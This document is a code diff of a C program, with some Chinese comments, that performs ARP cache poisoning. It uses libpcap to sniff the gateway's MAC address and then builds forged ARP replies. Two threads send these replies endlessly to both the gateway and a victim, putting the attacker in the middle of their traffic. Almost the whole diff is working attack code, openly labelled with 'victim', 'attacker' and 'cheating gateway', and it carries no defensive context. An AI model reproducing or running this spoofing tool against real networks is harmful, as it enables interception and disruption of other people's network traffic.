@@ -1,97 +1,175 @@
-#include "head.h"
+#include "HUAJI_head.h"
+#include <pthread.h>
 
-char *INTERFACE; //存储网卡设备
-u_char TARGET_MAC[6] = {0x74,0x29,0xaf,0x0f,0x09,0xe1}; //victim's mac
-u_char SOURCE_MAC[6] = {0x00,0xc2,0xc6,0xb9,0x4d,0x80}; //attacker's mac
-u_char TARGET_IP[4] = {192,168,1,223}; //victim's ip
-u_char SOURCE_IP[4] = {192,168,1,1}; //gateway's ip
-char errbuf[PCAP_ERRBUF_SIZE] = {0}; //存储错误信息
+/* about more thread */
+struct arg1 {
+    pcap_t *handle;
+    u_char *packet;
+    int size;
+} tar_arg, gate_arg;
 
-void input_mac(u_char *mac) {
-    int i;
-    for (i = 0; i < 6; i++) scanf("%hhx", &mac[i]);
+void *retval;
+pthread_t thread1, thread2, thread3;
+int ret_thread1, ret_thread2, ret_thread3;
+/* end */
+
+void *startG(void *arg) {
+    int i = 0;
+    struct arg1 *real_arg;
+    real_arg = (struct arg1 *)arg;
+    while (1) {
+        pcap_sendpacket(real_arg->handle, real_arg->packet, real_arg->size);
+        printf("Packet %d was sent to Gateway\n", ++i);
+        usleep(2e6);
+    }
+    pthread_exit(NULL);
 }
 
-void input_ip(u_char *ip) {
-    int i;
-    for (i = 0; i < 4; i++) scanf("%hhd", &ip[i]);
+void *startV(void *arg) {
+    int i = 0;
+    struct arg1 *real_arg;
+    real_arg = (struct arg1 *)arg;
+    while (1) {
+        pcap_sendpacket(real_arg->handle, real_arg->packet, real_arg->size);
+        printf("Packet %d was sent to Victim\n", ++i);
+        sleep(1);
+    }
+    pthread_exit(NULL);
+}
+
+u_char TARGET_MAC[6]; //victim's mac
+u_char ATTACKER_MAC[6]; //attacker's mac
+u_char GATEWAY_MAC[6]; //gateway's mac
+u_char TARGET_IP[4]; //victim's ip
+u_char GATEWAY_IP[4] = {192,168,1,1}; //gateway's ip
+
+/* get gatway's mac */
+void getgateway(u_char *user, const struct pcap_pkthdr *hp, const u_char *packet) {
+    ethernet_header *pEther = (ethernet_header *)packet;
+    loading();
+    printf("The gateway's MAC address is : ");
+    print_mac(pEther->SRC_mac);
+    memcpy(GATEWAY_MAC ,pEther->SRC_mac, 6);
+}
+
+/* create arp packet */
+void ARP_packet_build(u_char *ARPpacket, int packetsize,
+u_char *dst_mac, u_char *dst_ip, u_char *src_mac, u_char *src_ip, u_short op) {
+    ethernet_header ehead;
+    arp_header ahead;
+    memset(ARPpacket, 0, packetsize);
+    
+    /* about victim */
+    if (op == 1) { //ARP request
+        memset(ehead.DST_mac, 0xff, 6);
+        memset(ahead.dest_mac, 0x00, 6);
+        memset(ahead.dest_ip, 0, 4);
+    }
+    else { //ARP reply
+        memcpy(ehead.DST_mac, dst_mac, 6);
+        memcpy(ahead.dest_mac, dst_mac, 6);
+        memcpy(ahead.dest_ip, dst_ip, 4);
+    }
+    
+    /* about attacker */
+    memcpy(ehead.SRC_mac, src_mac, 6);
+    memcpy(ahead.src_mac, src_mac, 6);
+    memcpy(ahead.src_ip, src_ip, 4);
+    
+    /* others */
+    ehead.eth_type = htons((u_short)EPT_ARP);
+    ahead.hardware_type = htons((u_short)1);
+    ahead.protocol_type = htons((u_short)EPT_IPv4);
+    ahead.hardware_len = (u_char)6;
+    ahead.protocol_len = (u_char)4;
+    ahead.arp_option = htons((u_short)op);
+    
+    /* get together */
+    memcpy(ARPpacket, &ehead, sizeof(ehead));
+    memcpy(ARPpacket + sizeof(ehead), &ahead, sizeof(ahead));
+}
+
+/* send packet */
+void send_packet(pcap_t *handle, u_char *packet, int packetsize) {
+    if (pcap_sendpacket(handle, packet, packetsize) != 0)
+        printf("Packet send failed!\n");
 }
 
 int main(int argc, char const *argv[]) {
-    //第一步，初始化攻击资源
-    INTERFACE = pcap_lookupdev(errbuf); //返回寻找到的第一个网络设备的指针
-    if (INTERFACE == NULL) {
+    
+    /* definations */
+    char *dev;
+    char errbuf[PCAP_ERRBUF_SIZE] = {0};
+    u_int mask;
+    u_int net_addr;
+    char *net;
+    char *real_mask;
+    struct in_addr addr_net;
+    pcap_t *handle;
+    u_char ARPpacket[42];
+    u_char ARPpacket_forgateway[42];
+    struct bpf_program filter;
+    int counter = 0;
+    
+    /* get and start device */
+    dev = getdev(dev, errbuf);
+    if (pcap_lookupnet(dev, &net_addr, &mask, errbuf) == -1) {
+        printf("%s\n", errbuf); //打印错误信息
+        exit(1); //结束程序
+    }
+    addr_net.s_addr = net_addr;
+    net = inet_ntoa(addr_net);
+    printf("Opening device\n");
+    handle = pcap_open_live(dev, 65536, 1, 1000, errbuf);
+    if (!handle) {
         printf("%s\n", errbuf);
+        printf("If the Problem is \"you don't have permission\", please run this program as root!\n");
         exit(1);
     }
-    printf("Device: %s\n", INTERFACE);
-    /*printf("Your victim's MAC: ");
-    input_mac(TARGET_MAC);
-    printf("Your victim's IP: ");
-    input_ip(TARGET_IP);
-    printf("Your MAC: ");
-    input_mac(SOURCE_MAC);*/
-    //创建套接字
-    int soc;
-    u_char frame[42]; //以太网头部和ARP头部总长
-    printf("Creating socket\n");
     loading();
-    soc = socket(AF_PACKET, SOCK_RAW, htons(EPT_ARP));
-    if (soc == -1) {
-        printf("Socket creat failed!\n");
-        exit(1);
-    }
-    printf("Socket created!\n");
-    //构建伪造ARP帧
-    printf("Creating ARP packet\n");
+
+    /* get attack source */
+    printf("Please enter your victim's MAC (format: aa:aa:aa:aa:aa:aa)\n");
+    scanf("%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
+    &TARGET_MAC[0], &TARGET_MAC[1], &TARGET_MAC[2], &TARGET_MAC[3], &TARGET_MAC[4], &TARGET_MAC[5]);
+    printf("Please enter your victim's IP (format: 192.168.1.0)\n");
+    scanf("%hhd.%hhd.%hhd.%hhd", &TARGET_IP[0], &TARGET_IP[1], &TARGET_IP[2], &TARGET_IP[3]);
+    printf("Please enter your MAC (format: aa:aa:aa:aa:aa:aa)\n");
+    scanf("%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
+    &ATTACKER_MAC[0], &ATTACKER_MAC[1], &ATTACKER_MAC[2], &ATTACKER_MAC[3], &ATTACKER_MAC[4], &ATTACKER_MAC[5]);
+
+    /* get gateway's mac */
+    printf("Geting gateway's MAC\n");
+    char filter_app[] = "src 192.168.1.1";
+    pcap_compile(handle, &filter, filter_app, 0, *net);
+    pcap_setfilter(handle, &filter);
+    pcap_loop(handle, 1, getgateway, NULL);
+
+    /* cheating gateway */
+    ARP_packet_build(ARPpacket_forgateway, sizeof(ARPpacket_forgateway), GATEWAY_MAC, GATEWAY_IP, ATTACKER_MAC, TARGET_IP, 2);
+    printf("Cheating gateway preparing\n");
+    gate_arg.handle = handle;
+    gate_arg.packet = ARPpacket_forgateway;
+    gate_arg.size = sizeof(ARPpacket_forgateway);
     loading();
-    ethernet_header ehead;
-    arp_header arphead;
-    memcpy(ehead.DST_mac, TARGET_MAC, 6);
-    memcpy(ehead.SRC_mac, SOURCE_MAC, 6);
-    ehead.eth_type = htons(EPT_ARP);
-    arphead.hardware_type = htons(ARPHRD_ETHER);
-    arphead.protocol_type = htons(EPT_IPv4);
-    arphead.hardware_len = 6;
-    arphead.protocol_len = 4;
-    arphead.arp_option = htons(ARPOP_REPLY);
-    memcpy(arphead.src_mac, SOURCE_MAC, 6);
-    memcpy(arphead.src_ip, SOURCE_IP, 4);
-    memcpy(arphead.dest_mac, TARGET_MAC, 6);
-    memcpy(arphead.dest_ip, TARGET_IP, 4);
-    memcpy(frame, &ehead, sizeof(ehead));
-    memcpy(frame + sizeof(ehead), &arphead, sizeof(arphead));
-    printf("ARP packet created!\n");
-    //准备原始数据包
-    printf("Preparing\n");
+
+    /* cheating victim */
+    ARP_packet_build(ARPpacket, sizeof(ARPpacket), TARGET_MAC, TARGET_IP, ATTACKER_MAC, GATEWAY_IP, 2);
+    printf("Attack source preparing\n");
+    tar_arg.handle = handle;
+    tar_arg.packet = ARPpacket;
+    tar_arg.size = sizeof(ARPpacket);
     loading();
-    struct sockaddr_ll destaddr;
-    destaddr.sll_family = AF_PACKET;
-    if((destaddr.sll_ifindex = if_nametoindex(INTERFACE)) == 0) {
-        perror("if_nametoindex() failed\n");
-        exit(1);
-    }
-    destaddr.sll_halen = htons(6);
-    printf("Struct sockaddr_ll destaddr ready.\n");
-    //发送数据包
-    printf("Attacking!\n");
-    loading();
-    int i = 0;
-    char choose;
-    while(1) {
-        if(sendto(soc, frame, sizeof(frame), 0, (struct sockaddr *)&destaddr, sizeof(destaddr)) == -1) {
-        perror("sendto() failed\n");
-        exit(EXIT_FAILURE);
-    }
-    printf("Packet %d sent.\n", ++i);
-        if (i % 1000 == 0) {
-            printf("Do you want to send another 1000 packets to your victim? Y/N\n");
-            /*getchar();*/
-            scanf("%c", &choose);
-            if (choose != 'Y' && choose != 'y') break;
-        }
-    }
-    close(soc);
-    printf("Socket closed.\n");
+
+    /* Attack */
+    printf("Attack!\n");
+    ret_thread2 = pthread_create(&thread2, NULL, (void *)startG, (void *)&gate_arg);
+    ret_thread3 = pthread_create(&thread3, NULL, (void *)startV, (void *)&tar_arg);
+
+    /* before end */
+    pthread_join(thread2,NULL);
+    pthread_join(thread3,NULL);
+    pcap_close(handle);
+
     return 0;
 }
